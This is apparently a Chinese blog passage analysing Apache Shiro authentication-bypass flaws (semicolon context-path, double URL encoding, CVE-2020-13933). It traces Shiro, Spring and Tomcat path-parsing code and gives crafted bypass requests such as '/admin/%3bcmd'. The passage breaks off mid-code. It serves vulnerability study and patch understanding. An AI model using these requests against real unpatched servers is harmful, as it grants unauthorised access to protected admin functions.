<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = valueOrEmpty(request.getContextPath()) + <span class="string">&quot;/&quot;</span> + <span class="comment">// &quot;/test;&quot;</span></span><br><span class="line">              valueOrEmpty(request.getServletPath()) + <span class="comment">// &quot;/admin/cmd&quot;</span></span><br><span class="line">              valueOrEmpty(request.getPathInfo()); <span class="comment">// &quot;&quot;</span></span><br><span class="line">    &#125; <span class="comment">// uri: &quot;/test;//admin/cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> normalize(decodeAndCleanUriString(request, uri));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-1">decodeAndCleanUriString</h5>
<p>该方法对传入的 <strong>URI</strong> 字符串进行解码，并删除任何在分号
<strong>;</strong> 字符之后的多余部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tomcat-处理部分-1">Tomcat 处理部分</h4>
<h5 id="dofilter">doFilter</h5>
<p><strong>executeChain</strong> 调用 <strong>doFilter</strong> 之后进入
<strong>Tomcat</strong> 处理的部分。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ApplicationFilterChain (org.apache.catalina.core)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( Globals.IS_SECURITY_ENABLED ) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> request;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ServletResponse</span> <span class="variable">res</span> <span class="operator">=</span> response;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.security.AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span></span><br><span class="line">                        <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">                        internalDoFilter(req,res);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">catch</span>( PrivilegedActionException pe) &#123;</span><br><span class="line">            <span class="type">Exception</span> <span class="variable">e</span> <span class="operator">=</span> pe.getException();</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> ServletException)</span><br><span class="line">                <span class="keyword">throw</span> (ServletException) e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> IOException)</span><br><span class="line">                <span class="keyword">throw</span> (IOException) e;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RuntimeException)</span><br><span class="line">                <span class="keyword">throw</span> (RuntimeException) e;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ServletException</span>(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        internalDoFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinservletmapping-1">getPathWithinServletMapping</h5>
<p>返回请求 <strong>URL</strong> 中 <strong>servlet</strong>
之后的部分，例如 <strong>context-path</strong> 为
<strong>/test/</strong> 的时候 <strong>/test/admin/cmd</strong> 返回
<strong>/admin/cmd</strong>, <strong>/test;/admin/cmd</strong> 返回
<strong>/admin/cmd</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPathWithinServletMapping</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">pathWithinApp</span> <span class="operator">=</span> getPathWithinApplication(request); <span class="comment">// pathWithinApp: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">servletPath</span> <span class="operator">=</span> getServletPath(request); <span class="comment">// servletPath: &quot;/admin/cmd&quot;</span></span><br><span class="line">    <span class="comment">// 替换//为/</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">sanitizedPathWithinApp</span> <span class="operator">=</span> getSanitizedPath(pathWithinApp); <span class="comment">// sanitizedPathWithinApp: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">    String path;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (servletPath.contains(sanitizedPathWithinApp)) &#123;</span><br><span class="line">        path = getRemainingPath(sanitizedPathWithinApp, servletPath, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        path = getRemainingPath(pathWithinApp, servletPath, <span class="literal">false</span>); <span class="comment">// path: null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pathInfo</span> <span class="operator">=</span> request.getPathInfo(); <span class="comment">// pathInfo: null</span></span><br><span class="line">        <span class="keyword">if</span> (pathInfo != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> pathInfo;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.urlDecode) &#123;</span><br><span class="line">            path = getRemainingPath(decodeInternal(request, pathWithinApp), servletPath, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> pathWithinApp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> servletPath; <span class="comment">// servletPath: &quot;/admin/cmd&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication-2">getPathWithinApplication</h5>
<p>其中的 <strong>getRemainingPath</strong> 将给定的
<strong>mapping</strong> 与 <strong>requestUri</strong>
的开头进行匹配，如果匹配成功，则返回额外的部分。之所以需要此方法，是因为
<strong>HttpServletRequest</strong> 返回的上下文路径和
<strong>servlet</strong> 路径不同，<strong>requestUri</strong>
保留了分号内容用于传参。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">contextPath</span> <span class="operator">=</span> getContextPath(request); <span class="comment">// contextPath: &quot;/test;&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestUri</span> <span class="operator">=</span> getRequestUri(request); <span class="comment">// requestUri: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> getRemainingPath(requestUri, contextPath, <span class="literal">true</span>); <span class="comment">// path: null</span></span><br><span class="line">    <span class="keyword">if</span> (path != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (StringUtils.hasText(path) ? path : <span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> requestUri; <span class="comment">// requestUri: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-2">getRequestUri</h5>
<p>而 <strong>getRequestUri</strong> 返回的是
<strong>/test/admin/cmd</strong>，主要是经过了
<strong>decodeAndCleanUriString</strong> 方法的解析。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(WebUtils.INCLUDE_REQUEST_URI_ATTRIBUTE); <span class="comment">// uri: &quot;/test;/admin/cmd&quot;</span></span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri); <span class="comment">// return: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-2">decodeAndCleanUriString</h5>
<p>而在 <strong>decodeAndCleanUriString</strong> 方法中最主要的还是
<strong>removeSemicolonContent</strong> 方法，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = removeSemicolonContent(uri);</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    uri = getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="removesemicoloncontent">removeSemicolonContent</h5>
<p>当 <strong>this.removeSemicolonContent</strong> 为
<strong>true</strong> 的时候，调用
<strong>removeSemicolonContentInternal</strong> 方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">removeSemicolonContent</span><span class="params">(String requestUri)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.removeSemicolonContent ?</span><br><span class="line">            removeSemicolonContentInternal(requestUri) : removeJsessionid(requestUri));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5
id="removesemicoloncontentinternal">removeSemicolonContentInternal</h5>
<p>循环检测并删除 <strong>;</strong> 使得
<strong>/test;/admin/cmd</strong> 变成
<strong>/test/admin/cmd</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">removeSemicolonContentInternal</span><span class="params">(String requestUri)</span> &#123; <span class="comment">// requestUri: &quot;/test;/admin/cmd&quot;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> requestUri.indexOf(<span class="string">&#x27;;&#x27;</span>); <span class="comment">// semicolonIndex: 5</span></span><br><span class="line">    <span class="keyword">while</span> (semicolonIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slashIndex</span> <span class="operator">=</span> requestUri.indexOf(<span class="string">&#x27;/&#x27;</span>, semicolonIndex); <span class="comment">// slashIndex: 6</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">start</span> <span class="operator">=</span> requestUri.substring(<span class="number">0</span>, semicolonIndex); <span class="comment">// start: &quot;/test&quot;</span></span><br><span class="line">        requestUri = (slashIndex != -<span class="number">1</span>) ? start + requestUri.substring(slashIndex) : start;</span><br><span class="line">        semicolonIndex = requestUri.indexOf(<span class="string">&#x27;;&#x27;</span>, semicolonIndex);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> requestUri; <span class="comment">// requestUri: &quot;/test/admin/cmd&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="gethandlerinternal-1">getHandlerInternal</h5>
<p><strong>getPathWithinServletMapping</strong> 返回的
<strong>/admin/cmd</strong> 进入 <strong>lookupHandlerMethod</strong>
方法寻找相匹配的 <strong>serlvet</strong>，因为 <strong>Shiro</strong>
的差异性解析没有匹配上，最后进入 <strong>SpringBoot</strong> 匹配到
<strong>admin</strong> 路由句柄。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractHandlerMapping (org.springframework.web.servlet.handler)</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> getUrlPathHelper().getLookupPathForRequest(request); <span class="comment">// lookupPath: &quot;/admin/cmd&quot;</span></span><br><span class="line">    request.setAttribute(LOOKUP_PATH, lookupPath);</span><br><span class="line">    <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> lookupHandlerMethod(lookupPath, request);</span><br><span class="line">        <span class="keyword">return</span> (handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>); <span class="comment">// handlerMethod: &quot;st.southsea.shiro.LoginController#admin(String)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="双层-url-编码绕过">双层 URL 编码绕过</h3>
<p>配置如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># application.properties</span><br><span class="line">server.port=9090</span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/admin/a%252Fb</span><br></pre></td></tr></table></figure>
<p>同 <strong>context-path</strong> 绕过类似的调用过程。</p>
<h4 id="shiro-处理部分-2">Shiro 处理部分</h4>
<h5 id="executechain-1">executeChain</h5>
<p>从 <strong>executeChain</strong> 方法开始，执行过滤链，先调用
<strong>getExecutionChain</strong> 方法获取 <strong>shiro</strong>
配置的过滤链，然后执行 <strong>doFilter</strong> 方法进行过滤。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// AbstractShiroFilter (org.apache.shiro.web.servlet)</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">executeChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain origChain)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">    <span class="type">FilterChain</span> <span class="variable">chain</span> <span class="operator">=</span> getExecutionChain(request, response, origChain);</span><br><span class="line">    chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="调用栈-1">调用栈</h5>
<p>一路往下一直到 <strong>getRequestUri</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRequestUri:143, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:113, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:164, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:103, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getExecutionChain:415, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-3">getRequestUri</h5>
<p>此处 <strong>getServletPath</strong> 获取的值是经过一次
<strong>URL</strong> 解码的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = valueOrEmpty(request.getContextPath()) + <span class="string">&quot;/&quot;</span> + <span class="comment">// &quot;&quot;</span></span><br><span class="line">              valueOrEmpty(request.getServletPath()) + <span class="comment">// &quot;/admin/a%2fb&quot;</span></span><br><span class="line">              valueOrEmpty(request.getPathInfo()); <span class="comment">// &quot;&quot;</span></span><br><span class="line">    &#125; <span class="comment">// uri: &quot;/test;//admin/cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> normalize(decodeAndCleanUriString(request, uri));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-3">decodeAndCleanUriString</h5>
<p>而后调用的 <strong>decodeAndCleanUriString</strong> 方法中又做了一次
<strong>URL</strong> 解码，返回的值为
<strong>/admin/a/b</strong>，无法在 <strong>shiro</strong> 中根据
<strong>Ant</strong> 规则匹配到
<strong>/admin/*</strong>，因此同样的，<strong>getChain</strong>
方法返回空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> (semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="tomcat-处理部分-2">Tomcat 处理部分</h4>
<h5 id="调用栈-2">调用栈</h5>
<p>一路往下一直到 <strong>SpringBoot</strong> 的
<strong>getRequestUri</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getRequestUri:349, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinApplication:265, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getPathWithinServletMapping:216, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getLookupPathForRequest:172, UrlPathHelper (org.springframework.web.util)</span><br><span class="line">getHandlerInternal:363, AbstractHandlerMethodMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandlerInternal:110, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandlerInternal:59, RequestMappingInfoHandlerMapping (org.springframework.web.servlet.mvc.method)</span><br><span class="line">getHandler:395, AbstractHandlerMapping (org.springframework.web.servlet.handler)</span><br><span class="line">getHandler:1234, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doDispatch:1016, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">doService:943, DispatcherServlet (org.springframework.web.servlet)</span><br><span class="line">processRequest:1006, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">doGet:898, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:634, HttpServlet (javax.servlet.http)</span><br><span class="line">service:883, FrameworkServlet (org.springframework.web.servlet)</span><br><span class="line">service:741, HttpServlet (javax.servlet.http)</span><br><span class="line">internalDoFilter:231, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:53, WsFilter (org.apache.tomcat.websocket.server)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">executeChain:449, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getrequesturi-4">getRequestUri</h5>
<p>在 <strong>SpringBoot</strong> 的 <strong>getRequestUri</strong>
方法中调用的 <strong>getRequestURI</strong> 方法返回的是原始的值
<strong>/admin/a%252Fb</strong>，并未经过 <strong>URL</strong>
解码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getRequestUri</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">uri</span> <span class="operator">=</span> (String) request.getAttribute(WebUtils.INCLUDE_REQUEST_URI_ATTRIBUTE);</span><br><span class="line">    <span class="keyword">if</span> (uri == <span class="literal">null</span>) &#123;</span><br><span class="line">        uri = request.getRequestURI();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> decodeAndCleanUriString(request, uri);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="decodeandcleanuristring-4">decodeAndCleanUriString</h5>
<p>而后调用 <strong>decodeAndCleanUriString</strong> 方法解码一次，返回
<strong>/admin/a%2fb</strong>，匹配到 <strong>admin/*</strong>
路由，成功绕过。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// UrlPathHelper (org.springframework.web.util)</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">decodeAndCleanUriString</span><span class="params">(HttpServletRequest request, String uri)</span> &#123;</span><br><span class="line">    uri = removeSemicolonContent(uri);</span><br><span class="line">    uri = decodeRequestString(request, uri);</span><br><span class="line">    uri = getSanitizedPath(uri);</span><br><span class="line">    <span class="keyword">return</span> uri;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="漏洞修复-1">漏洞修复</h2>
<p><strong>Shiro</strong> 在 <a
href="https://github.com/apache/shiro/commit/01887f645f92d276bbaf7dc644ad28ed4e82ef02"><strong>Commit</strong></a>
中修改了 <strong>URL</strong> 获取的逻辑。</p>
<p>在 <strong>WebUtils#getPathWithinApplication</strong> 中，使用
<strong>getServletPath(request) + getPathInfo(request)</strong>。</p>
<p>在 <strong>WebUtils#getRequestUri</strong> 中，修改处理逻辑与
<strong>SpringBoot</strong> 一致。</p>
<p><img
src="/images/Study-Unauthorized-Shiro/github.com_apache_shiro_commit_01887f645f92d276bbaf7dc644ad28ed4e82ef02.png" /></p>
<h1 id="cve-2020-13933">CVE-2020-13933</h1>
<h2 id="漏洞简介-2">漏洞简介</h2>
<p>影响版本：<strong>shiro &lt; 1.6.0</strong></p>
<p>漏洞描述：<strong>Shiro</strong>
由于处理身份验证请求时存在权限绕过漏洞，特制的<strong>HTTP</strong>请求可以绕过身份验证过程并获得对应用程序的未授权访问。</p>
<p>测试环境：<strong>Shiro 1.5.3</strong>，<strong>SpringBoot
2.2.6.RELEASE</strong></p>
<h2 id="漏洞分析-2">漏洞分析</h2>
<h3 id="绕过-1">; 绕过</h3>
<p>配置如下。</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment"># application.properties</span></span><br><span class="line"><span class="attr">server.port</span>=<span class="string">9090</span></span><br></pre></td></tr></table></figure>
<p><strong>HTTP</strong> 请求如下。</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET http://127.0.0.1:9090/admin/%3bcmd</span><br></pre></td></tr></table></figure>
<h4 id="shiro-处理部分-3"><strong>Shiro</strong> 处理部分</h4>
<h5 id="调用栈-3">调用栈</h5>
<p>一路往下一直到 <strong>getPathWithinApplication</strong> 方法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getPathWithinApplication:112, WebUtils (org.apache.shiro.web.util)</span><br><span class="line">getPathWithinApplication:164, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getChain:103, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">getExecutionChain:415, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">executeChain:448, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br></pre></td></tr></table></figure>
<h5 id="getpathwithinapplication-3">getPathWithinApplication</h5>
<p>同上一个版本类似，即使修复了，但是在
<strong>getPathWithinApplication</strong> 中调用的
<strong>getServletPath</strong> 方法获得的 <strong>URL</strong>
是依旧是经过 <strong>URL</strong> 解码的，然后才调用了
<strong>removeSemicolon</strong> 方法，移除了 <strong>;</strong>
之后的字符串，返回了 <strong>/admin/</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPathWithinApplication</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> normalize(removeSemicolon(getServletPath(request) + getPathInfo(request)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="removesemicolon">removeSemicolon</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// WebUtils (org.apache.shiro.web.util)</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">removeSemicolon</span><span class="params">(String uri)</span> &#123; <span class="comment">// uri: &quot;/admin/;cmd&quot;</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> uri.indexOf(<span class="number">59</span>);</span><br><span class="line">    <span class="keyword">return</span> semicolonIndex != -<span class="number">1</span> ? uri.substring(<span class="number">0</span>, semicolonIndex) : uri; <span class="comment">// &quot;/admin/&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="getchain-2">getChain</h5>
<p><strong>getChain</strong> 中获取到 <strong>requestURI</strong> 为
<strong>/admin/</strong>，然后被 <strong>Shiro</strong>
的安全机制替换掉了最后的斜杠，得到
<strong>/admin</strong>，接着循环遍历匹配路径，由于配置为
<strong>/admin/*</strong>，不会匹配到
<strong>/admin</strong>，因此返回空。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span></span><br><span class="line"><span class="keyword">public</span> FilterChain <span class="title function_">getChain</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain originalChain)</span> &#123;</span><br><span class="line">    <span class="type">FilterChainManager</span> <span class="variable">filterChainManager</span> <span class="operator">=</span> getFilterChainManager();</span><br><span class="line">    <span class="keyword">if</span> (!filterChainManager.hasChains()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">requestURI</span> <span class="operator">=</span> getPathWithinApplication(request);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(requestURI != <span class="literal">null</span> &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(requestURI)</span><br><span class="line">            &amp;&amp; requestURI.endsWith(DEFAULT_PATH_SEPARATOR)) &#123;</span><br><span class="line">        requestURI = requestURI.substring(<span class="number">0</span>, requestURI.length() - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (String pathPattern : filterChainManager.getChainNames()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (pathPattern != <span class="literal">null</span> &amp;&amp; !DEFAULT_PATH_SEPARATOR.equals(pathPattern)</span><br><span class="line">                &amp;&amp; pathPattern.endsWith(DEFAULT_PATH_SEPARATOR)) &#123;</span><br><span class="line">            pathPattern = pathPattern.substring(<span class="number">0</span>, pathPattern.length() - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If the path does match, then pass on to the subclass implementation for specific checks:</span></span><br><span class="line">        <span class="keyword">if</span> (pathMatches(pathPattern, requestURI)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">                log.trace(<span 